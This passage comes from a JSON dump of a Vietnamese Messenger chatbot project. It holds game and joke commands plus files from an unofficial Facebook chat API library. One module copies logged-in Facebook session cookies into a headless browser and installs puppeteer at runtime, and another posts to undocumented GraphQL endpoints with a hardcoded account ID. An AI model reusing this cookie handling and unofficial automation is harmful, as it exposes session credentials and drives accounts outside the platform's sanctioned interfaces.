if(data.board[0][i] == data.board[1][i] && data.board[0][i] == data.board[2][i] && data.board[0][i] == 2) return true;\n  }\n  return false;\n}\n\nfunction solveAIMove({depth, turn, data}) {\n  if (checkAIWon(data)) return +1;\n  if (checkPlayerWon(data)) return -1;\n  let availablePoint = getAvailable(data);\n  if (availablePoint.length == 0) return 0;\n\n  var min = Number.MAX_SAFE_INTEGER;\n  var max = Number.MIN_SAFE_INTEGER;\n\n  for (var i = 0, length = availablePoint.length; i < length; i++) {\n    var point = availablePoint[i];\n    if (turn == 1) {\n      placeMove({point, player: 1, data});\n      var currentScore = solveAIMove({depth: depth + 1, turn: 2, data});\n      max = Math.max(currentScore, max);\n      if (currentScore >= 0) {\n        if (depth == 0) AIMove = point;\n      }\n      if (currentScore == 1) {\n        data.board[point[0]][point[1]] = 0;\n        break;\n      }\n       if(i == availablePoint.length - 1 && max < 0) {\n        if(depth == 0) AIMove = point;\n      }\n    }\n    else if (turn == 2) {\n      placeMove({point, player: 2, data});\n      var currentScore = solveAIMove({depth: depth + 1, turn: 1, data});\n      min = Math.min(currentScore, min);\n      if (min == -1) {\n        data.board[point[0]][point[1]] = 0;\n        break;\n      }\n    }\n    data.board[point[0]][point[1]] = 0;\n  }\n  return turn == 1 ? max : min;\n}\n\nfunction placeMove({point, player, data}) {\n  return data.board[point[0]][point[1]] = player;\n}\n\nfunction getAvailable(data) {\n  let availableMove = []\n  for (var i = 0; i < 3; i++) {\n    for (var j = 0; j < 3; j++) {\n      if (data.board[i][j] == 0) availableMove.push([i, j]);\n    }\n  }\n  return availableMove;\n}\n\nfunction checkAvailableSpot(point, pointArray) {\n  if (pointArray.find(element => element.toString() == point.toString())) return true;\n  else return false;\n}\n\nfunction move(x, y, data) {\n  var availablePoint = getAvailable(data);\n  var playerMove = [x, y];\n  if (checkAvailableSpot(playerMove, availablePoint)) {\n    placeMove({point: playerMove, player: 2, data});\n  } else return \"√î n√†y ƒë√£ ƒë∆∞·ª£c ƒë√°nh d·∫•u!\";\n  solveAIMove({depth: 0, turn: 1, data});\n  placeMove({point: AIMove, player: 1, data});\n}\n\nfunction checkGameOver(data) {\n  if (getAvailable(data).length == 0 || checkAIWon(data) || checkPlayerWon(data)) return true;\n  return false;\n}\n\nfunction AIStart(data) {\n  var point = [Math.round(Math.random()) * 2, Math.round(Math.random()) * 2];\n  placeMove({point, player: 1, data});\n}\n\n\nmodule.exports.handleReply = async function({ event, api, handleReply }) {\n  let { body, threadID, messageID, senderID } = event;\n  if (!global.moduleData.tictactoe) global.moduleData.tictactoe = new Map();\n  let data = global.moduleData.tictactoe.get(threadID);\n  if (!data || data.gameOn == false) return;\n  var number = parseInt(body);\n  if(!isNaN(number) && number > 0 && number < 10) {\n    var row = number < 4 ? 0 : number < 7 ? 1 : 2;\n    if (number == 1 || number == 4 || number == 7) var col = 0;\n    if (number == 2 || number == 5 || number == 8) var col = 1;\n    if (number == 3 || number == 6 || number == 9) var col = 2;\n    var temp = move(row, col, data);\n    var lmao = \"\";\n    if(checkGameOver(data)) {\n      if(checkAIWon(data)) lmao = `You lose!`;\n      else if(checkPlayerWon(data)) lmao = \"You win!\";\n      else lmao = \"H√≤a r·ªìi!\";\n      global.moduleData.tictactoe.delete(threadID);\n    }\n    var msg = lmao !== \"\" ? lmao : temp == undefined ? \"Reply s·ªë √¥ ƒë·ªÉ ƒë√°nh d·∫•u\" : temp;\n    api.sendMessage({ body: msg, attachment: await displayBoard(data)}, threadID, (error, info) => {\n      global.client.handleReply.push({\n        name: this.config.name,\n        author: senderID,\n        messageID: info.messageID\n      })\n    }, messageID);\n  } else return api.sendMessage(\"S·ªë √¥ kh√¥ng h·ª£p l·ªá!\", threadID, messageID);\n}\n\nmodule.exports.run = async function ({ event, api, args }) {\n  if (!global.moduleData.tictactoe) global.moduleData.tictactoe = new Map();\n  let { threadID, messageID, senderID } = event;\n  const threadSetting = global.data.threadData.get(threadID) || {};\n  var prefix = threadSetting.PREFIX || global.config.PREFIX;\n  let data = global.moduleData.tictactoe.get(threadID) || { \"gameOn\": false, \"player\": \"\" };\n  let concak = \"\" + prefix + this.config.name;\n  let newData;\n  if (args.length == 0) return api.sendMessage(\"Vui l√≤ng ch·ªçn X ho·∫∑c O\", threadID, messageID);\n  if (args[0].toLowerCase() == \"delete\") {\n    global.moduleData.tictactoe.delete(threadID);\n    return api.sendMessage(\"ƒê√£ x√≥a b√†n c·ªù!\", threadID, messageID);\n  }\n  if (args[0].toLowerCase() == \"continue\") {\n    if (!data.gameOn) return api.sendMessage(\"Kh√¥ng c√≥ d·ªØ li·ªáu! d√πng \" + concak + \" x/o ƒë·ªÉ ch∆°i m·ªõi\", threadID, messageID);\n    return api.sendMessage({ body: \"Reply s·ªë √¥ ƒë·ªÉ ƒë√°nh d·∫•u\", attachment: await displayBoard(data)}, threadID, (error, info) => {\n      global.client.handleReply.push({\n        name: this.config.name,\n        author: senderID,\n        messageID: info.messageID\n      })\n    }, messageID);\n  }\n  if (!data.gameOn) {\n    var abc = args[0].toLowerCase();\n    if (abc !== \"x\" && abc !== \"o\") return api.sendMessage(\"Vui l√≤ng ch·ªçn X ho·∫∑c O\", threadID, messageID);\n    if (abc == \"o\") {\n      newData = startBoard({ isX: false, data, threadID });\n      api.sendMessage({ body: \"B·∫°n ƒëi tr∆∞·ªõc!\\nReply s·ªë √¥ ƒë·ªÉ ƒë√°nh d·∫•u\", attachment: await displayBoard(newData)}, threadID, (error, info) => {\n        global.client.handleReply.push({\n          name: this.config.name,\n          author: senderID,\n          messageID: info.messageID\n        })\n      }, messageID);\n    }\n    if (abc == \"x\") {\n      newData = startBoard({ isX: true, data, threadID });\n      AIStart(newData);\n      api.sendMessage({ body: \"AI ƒëi tr∆∞·ªõc!\\nReply s·ªë √¥ ƒë·ªÉ ƒë√°nh d·∫•u\", attachment: await displayBoard(data)}, threadID,(error, info) => {\n        global.client.handleReply.push({\n          name: this.config.name,\n          author: senderID,\n          messageID: info.messageID\n        })\n      }, messageID);\n    }\n    newData.player = senderID;\n    global.moduleData.tictactoe.set(threadID, newData);\n  } else return api.sendMessage(\"Nh√≥m n√†y ƒë√£ t·ªìn t·∫°i b√†n c·ªù\\nD√πng:\\n\" + concak + \" continue -> ti·∫øp t·ª•c\\n\" + concak + \" delete -> x√≥a\", threadID, messageID);\n}","path":null,"size_bytes":8895,"size_tokens":null},"modules/commands/enchant.js":{"content":"module.exports.config = {\n    name: \"enchant\",\n    version: \"1.0.1\",\n    hasPermssion: 0,\n    credits: \"Trung Ki√™n\",\n    description: \"Chuy·ªÉn ƒë·ªïi vƒÉn b·∫£n c·ªßa b·∫°n sang ng√¥n ng·ªØ c·ªßa B√†n Ph√π Ph√©p Minecraft\",\n    commandCategory: \"Ti·ªán √≠ch\",\n    cooldowns: 10\n};\nmodule.exports.run = async function({ api, event, args }) {\n    const { threadID, messageID, senderID, body } = event;\n    var content = args.join(\" \").toLowerCase();;\n     \t\tif (!content) return api.sendMessage(`Baka! You must give me something to enchant.`,event.threadID,event.messageID);\n    let msgtext = content.replace(/a/gi, \"·îë\")\n      .replace(/b/gi, \" ñ\")\n      .replace(/c/gi, \"·ìµ\")\n      .replace(/d/gi, \"‚Ü∏\")\n      .replace(/f/gi, \"‚éì\")\n      .replace(/g/gi, \"‚ä£\")\n      .replace(/h/gi, \"‚çë\")\n      .replace(/i/gi, \"‚ïé\")\n      .replace(/j/gi, \"‚ãÆ\")\n      .replace(/k/gi, \"Íñå\")\n      .replace(/l/gi, \"Íñé\")\n      .replace(/m/gi, \"·í≤\")\n      .replace(/n/gi, \"„É™\")\n      .replace(/o/gi, \"ùôπ\")\n      .replace(/p/gi, \"!¬°\")\n      .replace(/q/gi, \"·ëë\")\n      .replace(/r/gi, \"‚à∑\")\n      .replace(/s/gi, \"·ì≠\")\n      .replace(/t/gi, \"‚Ñ∏ Ã£\")\n      .replace(/u/gi, \"‚öç\")\n      .replace(/v/gi, \"‚çä\")\n      .replace(/w/gi, \"‚à¥\")\n      .replace(/x/gi, \"¬∑/\")\n      .replace(/y/gi, \"||\")\n      .replace(/z/gi, \"‚®Ö\");;\n    return api.sendMessage(msgtext, threadID,messageID);\n}\n","path":null,"size_bytes":1382,"size_tokens":null},"modules/commands/dodepgai.js":{"content":"module.exports.config = {\n    name: \"dodepgai\",\n    version: \"0.0.1\",\n    hasPermssion: 0,\n    credits: \"SEN\",\n    description: \"ƒëo ƒë·ªô ƒë·∫πp g√°i\",\n    commandCategory: \"Nh√≥m\",\n    cooldowns: 5\n  };\n  \n  module.exports.run = function({ api, event }) {\n    const data = [\"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 1%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 2%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 3%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 4%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 5%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 6%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 7%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 8%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 9%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 10%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 11%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 12%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 13%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 14%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 15%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 16%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 17%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 18%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 19%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 20%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 21%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 22%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 23%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 24%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 25%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 26%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 27%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 28%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 29%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 30%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 31%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 32%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 33%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 34%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 35%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 36%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 37%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 38%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 39%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 40%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 41%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 42%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 43%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 44%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 45%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 46%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 47%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 48%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 49%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 50%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 51%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 52%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 53%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 54%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 55%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 56%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 57%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 58%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 59%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 60%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 61%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 62%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 63%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 64%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 65%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 66%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 67%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 68%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 69%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 70%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 71%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 72%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 73%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 74%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 75%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 76%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 77%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 78%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 79%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 80%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 81%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 82%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 83%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 84%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 85%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 86%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 87%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 88%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 89%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 90%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 91%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 92%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 93%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 94%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 95%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 96%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 97%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 98%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 99%\", \"ƒê·ªô ƒë·∫πp g√°i c·ªßa b·∫°n l√† 100%\",];\n    return api.sendMessage(`${data[Math.floor(Math.random() * data.length)]}`, event.threadID, event.messageID);\n  }","path":null,"size_bytes":4486,"size_tokens":null},"lib/fca-auto/src/Dev_shareTest3.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n\treturn async function shareTest(text, senderID, threadID, callback) {\n\t\tvar resolveFunc = function () { };\n\t\tvar rejectFunc = function () { };\n\t\tvar returnPromise = new Promise(function (resolve, reject) {\n\t\t\tresolveFunc = resolve;\n\t\t\trejectFunc = reject;\n\t\t});\n\t\tif (!callback) {\n\t\t\tcallback = function (err, data) {\n\t\t\t\tif (err) return rejectFunc(err);\n\t\t\t\tresolveFunc(data);\n\t\t\t};\n\t\t}\n        console.log('11111111111')\n\t\t\n\n\t\tconst form = {\n\t\t\timage_file: global.Fca.Require.fs.readFileSync(__dirname + \"/abc.jpg\", 'base64')\t\t\t,\n\t\t\tav: 100077059530660,\n\t\t\tfb_api_req_friendly_name: \"CustomUpdateMutationModern_MarkAfterShareShownMutation\",\n\t\t\tlsd: \"0\",\n\n\t\t\tvariables:JSON.stringify({\n\t\t\t\tinput: {\n\t\t\t\t  \"context_token_id\": \"0\",\n\t\t\t\t  \"cta\": \"Play Now\",\n\t\t\t\t  \"data\":JSON.stringify({\n\t\t\t\t\t\"inviteTime\": 1713075355422,\n\t\t\t\t\t\"inviteId\": 2566710246101,\n\t\t\t\t\t\"contextId\": \"0\",\n\t\t\t\t\t\"inviteActivityId\": 220097,\n\t\t\t\t\t\"type\": \"invite_friend_friendlist\",\n\t\t\t\t\t\"token\": \"\"\n\t\t\t\t  }),\n\t\t\t\t  \"extra\": JSON.stringify({\n\t\t\t\t\t\"template\": \"join_fight\",\n\t\t\t\t\t\"notification\": \"PUSH\"\n\t\t\t\t  }),\n\t\t\t\t  \"game_id\": \"0\",\n\t\t\t\t  \"image_file_content_type\": \"application/base64\",\n\t\t\t\t  \"play_style\": \"BASIC\",\n\t\t\t\t  \"session_id\": utils.getGUID(),\n\t\t\t\t  \"text\": \"0\",\n\t\t\t\t  \"actor_id\": \"100077059530660\",\n\t\t\t\t  \"client_mutation_id\":Math.round(Math.random()*19).toString()\n\t\t\t\t}\n\t\t\t  }),\n\t\t\tfb_api_caller_class: \"RelayModern\",\n\t\t\tserver_timestamps: true,\ndoc_id: 0\n\t\t}\n\t\tdefaultFuncs\n\t\t.post(\"https://www.facebook.com/api/graphql\", ctx.jar, form)\n\t\t.then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n\t\t.then(function(resData) {\n\t\t\tconsole.log(resData)\n\t\t\tif (resData.error) throw resData;\n\t\t\telse return callback(null,true)\n\t\t})\n\t\t.catch(function(err) {\n\t\treturn callback(err);\n\t});\n\t\treturn returnPromise;\n\t};\n};\n","path":null,"size_bytes":1916,"size_tokens":null},"lib/Fca-Horizon-Remastered/SECURITY.md":{"content":"# Security Policy\n\n+ if have any Vulnerability finded contact: Author(KanzuWakazaki.Main@proton.me) or (Facebook.com/Lazic.Kanzu). Thanks!\n\n## Supported Versions\n\nUse this section to tell people about which versions of your project are\ncurrently being supported with security updates.\n\n| Version | Supported          |\n| ------- | ------------------ |\n| StableVersion | :white_check_mark: |\n| AutoUpdate | :white_check_mark:|\n| Modified | :x:\n\n## Reporting a Vulnerability\n\nContact Author or create pull!\n","path":null,"size_bytes":505,"size_tokens":null},"modules/commands/age.js":{"content":"// Loli is the best!!\nmodule.exports.config = {\n\tname: \"age2\",\n\tversion: \"1.0.0\",\n\thasPermssion: 0,\n\tcredits: \"Khoa\",\n\tdescription: \"T√≠nh tu·ªïi\",\n\tcommandCategory: \"Ti·ªán √≠ch\",\n\tusages: \"[ng√†y/th√°ng/nƒÉm sinh]\",\n\tcooldowns: 0\n};\n\nmodule.exports.run = async function ({ event, args, api }) {\n  var input = args[0];\n  if (!input) return api.sendMessage(`Vui l√≤ng nh·∫≠p ƒë√∫ng format >age [ng√†y/th√°ng/nƒÉm sinh]`,event.threadID,event.messageID);\n  var cc = input.split(\"/\");\n  var ngay1 = parseInt(cc[0]);\n  if (!ngay1 || isNaN(ngay1) || ngay1 > 31 || ngay1 < 1) return api.sendMessage(\"Ng√†y sinh kh√¥ng h·ª£p l·ªá!\",event.threadID,event.messageID);\n  var thang1 = parseInt(cc[1]);\n  if (!thang1 || isNaN(thang1) || thang1 > 12 || thang1 < 1) return api.sendMessage(\"Th√°ng sinh kh√¥ng h·ª£p l·ªá!\",event.threadID,event.messageID);\n  var nam1 = parseInt(cc[2]);\n  if (!nam1) return api.sendMessage(\"NƒÉm sinh kh√¥ng h·ª£p l·ªá!\",event.threadID,event.messageID);\n  const moment = require(\"moment-timezone\");\n  var hientai = moment.tz(\"Asia/Ho_Chi_Minh\").format(\"DD/MM/YYYY HH:mm:ss\");\n  var concac = `${hientai}`;\n  var djtme = concac.split(\" \");\n  var dm = djtme[0].split(\"/\");\n  var ngay2 = parseInt(dm[0]);\n  var thang2 = parseInt(dm[1]);\n  var nam2 = parseInt(dm[2]);\n  var ngay3 = ngay2 - ngay1;\n  var thang3 = thang2 - thang1;\n  var nam3 = nam2 - nam1;\n  var duma = djtme[1].split(\":\");\n  var hh = parseInt(duma[0]);\n  var mm = parseInt(duma[1]);\n  var ss = parseInt(duma[2]);\n  var nam = nam3 + Math.round(thang3/12 * 100)/100;\n  var xthang = nam*12 + thang3 + ngay1/31;\n  var thang = Math.round(xthang * 100)/100;\n  var dcm = thang/36;\n  var tuan = Math.round(thang*4 * 100)/100;\n  var xngay = (xthang*31 + xthang*30)/2 - dcm*3/2 + ngay3 + hh/24;\n  var wtf = (xthang*31 + xthang*30)/2 - dcm*3/2 + ngay3;\n  var ngay = Math.round(xngay * 100)/100;\n  var gio = Math.round((wtf*24 + hh) * 100)/100;\n  var xphut = gio*60 + mm + ss/60;\n  var phut = Math.round(xphut * 100)/100;\n  var giay = Math.round((phut*60 + ss)* 100)/100;\n  // N·ªó n√£o :>\n  return api.sendMessage(`-Ng√†y th√°ng nƒÉm sinh: ${input}\\n\\n-S·ªë nƒÉm ƒë√£ qua: ${nam} nƒÉm \\n-S·ªë th√°ng ƒë√£ qua: ${thang} th√°ng \\n-S·ªë tu·∫ßn ƒë√£ qua: ${tuan} tu·∫ßn \\n-S·ªë ng√†y ƒë√£ qua: ${ngay} ng√†y \\n-S·ªë gi·ªù ƒë√£ qua: ${gio} gi·ªù \\n-S·ªë ph√∫t ƒë√£ qua: ${phut} ph√∫t \\n-S·ªë gi√¢y ƒë√£ qua: ${giay} gi√¢y `,event.threadID,event.messageID);\n}","path":null,"size_bytes":2419,"size_tokens":null},"lib/fca-auto/src/setMessageReaction.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  function setMessageReaction(reaction, messageID, callback, forceCustom = false) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err) {\n        if (err) return rejectFunc(err);\n        resolveFunc();\n      };\n    }\n\n    if (!messageID) {\n      callback({ error: \"Message ID kh√¥ng ƒë∆∞·ª£c ƒë·ªÉ tr·ªëng\" });\n      return returnPromise;\n    }\n\n    // X·ª≠ l√Ω reaction text sang emoji\n    reaction = parseReaction(reaction);\n\n    // Prepare data request\n    var variables = {\n      data: {\n        client_mutation_id: ctx.clientMutationId++,\n        actor_id: ctx.userID,\n        action: reaction == \"\" ? \"REMOVE_REACTION\" : \"ADD_REACTION\",\n        message_id: messageID,\n        reaction: reaction || \"\"\n      }\n    };\n\n    var qs = {\n      doc_id: \"1491398900900362\",\n      variables: JSON.stringify(variables),\n      dpr: 1\n    };\n\n    defaultFuncs\n      .postFormData(\"https://www.facebook.com/webgraphql/mutation/\", ctx.jar, {}, qs)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (!resData) {\n          throw { error: \"setReaction returned empty object.\" };\n        }\n        if (resData.error) {\n          throw resData;\n        }\n        callback();\n      })\n      .catch(function (err) {\n        log.error(\"setReaction\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  }\n\n  // H√†m x·ª≠ l√Ω chuy·ªÉn ƒë·ªïi reaction text sang emoji\n  function parseReaction(reaction) {\n    // N·∫øu l√† emoji ho·∫∑c r·ªóng th√¨ gi·ªØ nguy√™n\n    if (!reaction || isEmoji(reaction)) return reaction;\n\n    // Map c√°c shortcut ph·ªï bi·∫øn\n    const reactionMap = {\n      \"like\": \"üëç\",\n      \"love\": \"‚ù§Ô∏è\",\n      \"heart\": \"‚ù§\",\n      \"haha\": \"üòÜ\",\n      \"wow\": \"üòÆ\", \n      \"sad\": \"üò¢\",\n      \"angry\": \"üò†\",\n      \":like:\": \"üëç\",\n      \":love:\": \"‚ù§Ô∏è\",\n      \":haha:\": \"üòÜ\",\n      \":wow:\": \"üòÆ\",\n      \":sad:\": \"üò¢\", \n      \":angry:\": \"üò†\",\n      \"none\": \"\",\n      \"remove\": \"\",\n      \"clear\": \"\"\n    };\n\n    // Tr·∫£ v·ªÅ emoji t∆∞∆°ng ·ª©ng ho·∫∑c gi·ªØ nguy√™n n·∫øu kh√¥ng c√≥ trong map\n    return reactionMap[reaction.toLowerCase()] || reaction;\n  }\n\n  // H√†m ki·ªÉm tra m·ªôt string c√≥ ph·∫£i l√† emoji kh√¥ng - s·ª≠ d·ª•ng regex ƒë∆°n gi·∫£n\n  function isEmoji(str) {\n    const emojiPattern = /(?:[\\u2700-\\u27bf]|(?:\\ud83c[\\udde6-\\uddff]){2}|[\\ud800-\\udbff][\\udc00-\\udfff]|[\\u0023-\\u0039]\\ufe0f?\\u20e3|\\u3299|\\u3297|\\u303d|\\u3030|\\u24c2|\\ud83c[\\udd70-\\udd71]|\\ud83c[\\udd7e-\\udd7f]|\\ud83c\\udd8e|\\ud83c[\\udd91-\\udd9a]|\\ud83c[\\udde6-\\uddff]|\\ud83c[\\ude01-\\ude02]|\\ud83c\\ude1a|\\ud83c\\ude2f|\\ud83c[\\ude32-\\ude3a]|\\ud83c[\\ude50-\\ude51]|\\u203c|\\u2049|[\\u25aa-\\u25ab]|\\u25b6|\\u25c0|[\\u25fb-\\u25fe]|\\u00a9|\\u00ae|\\u2122|\\u2139|\\ud83c\\udc04|[\\u2600-\\u26FF]|\\u2b05|\\u2b06|\\u2b07|\\u2b1b|\\u2b1c|\\u2b50|\\u2b55|\\u231a|\\u231b|\\u2328|\\u23cf|[\\u23e9-\\u23f3]|[\\u23f8-\\u23fa]|\\ud83c\\udccf|\\u2934|\\u2935|[\\u2190-\\u21ff])/;\n    return emojiPattern.test(str);\n  }\n\n  return function (reaction, messageID, callback, forceCustom = false) {\n    try {\n      return setMessageReaction(reaction, messageID, callback, forceCustom);\n    } catch (error) {\n      log.error(\"setMessageReaction\", error);\n      if (callback) callback(error);\n      throw error;\n    }\n  };\n};","path":null,"size_bytes":3586,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/Screenshot.js":{"content":"/* eslint-disable linebreak-style */\n\"use strict\";\n\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n    var Coookie = JSON.parse(JSON.stringify(ctx.jar.getCookies(\"https://www.facebook.com\").concat(ctx.jar.getCookies(\"https://facebook.com\")).concat(ctx.jar.getCookies(\"https://www.messenger.com\"))));\n    for (let i of Coookie) {\n        i.name = i.key;\n        i.domain = 'www.facebook.com';\n        delete i.key;\n    }\n    return function(Link, callback) {\n        var logger = require('../logger');\n        if (process.platform != 'win32') return logger.Error('Not Supported Platform');\n        else try {\n            let i = require('puppeteer');\n        }   \n        catch (e) {\n            var { execSync } = require('child_process');\n            execSync('npm i puppeteer', { stdio: 'inherit' });\n        }\n            const Screenshot = require('../Extra/ExtraScreenShot');\n                var resolveFunc = function () { };\n                var rejectFunc = function () { };\n                var returnPromise = new Promise(function (resolve, reject) {\n                resolveFunc = resolve;\n                rejectFunc = reject;\n                });\n\n                if (!callback) {\n                    callback = function (err, data) {\n                        if (err) return rejectFunc(err);\n                        resolveFunc(data);\n                    };\n                }\n        if (Link.includes('facebook.com') || Link.includes('Facebook.com') || Link.includes('fb')) {\n            let LinkSplit = Link.split('/');\n                if (LinkSplit.indexOf(\"https:\") == 0) {\n                    if (Link.includes('messages')) {\n                        Screenshot.buffer(Link, {\n                            cookies: Coookie\n                        }).then(data => {\n                            callback(null,data);\n                        });\n                    